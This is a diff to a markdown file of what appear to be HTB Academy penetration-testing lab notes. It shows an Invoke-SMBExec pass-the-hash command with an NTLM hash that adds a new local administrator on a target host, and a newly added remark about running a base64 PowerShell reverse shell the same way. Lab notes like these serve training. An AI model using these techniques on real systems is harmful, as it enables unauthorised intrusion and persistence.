@@ -27,3 +27,6 @@ Following example command on powershell will create user and add it to local adm
 Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
 ```
 ![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/e08a278a-ad9b-49bd-8d3d-287ebef07549)
+
+## Idea !
+We can also use powershell reverse shell by base64, for that we just need to specify command after `-Command` flag
